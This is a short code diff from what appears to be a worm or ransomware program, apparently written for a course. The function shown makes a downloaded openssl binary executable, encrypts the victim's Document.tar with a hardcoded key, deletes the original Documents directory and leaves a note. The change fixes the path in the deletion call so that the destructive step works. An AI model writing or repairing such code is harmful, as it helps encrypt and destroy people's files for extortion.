@@ -76,7 +76,7 @@ def downloadAndEncrypt(path):
 	call(["chmod", "a+x", "./openssl"])
 	call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "Document.tar", "-out", "Document.tar.enc", "-k", "cs456worm"])
 	# delete the original directory
-	shutil.rmtree(path+'Documents/')
+	shutil.rmtree(path+'/Documents/')
 	leaveNote()
 
 
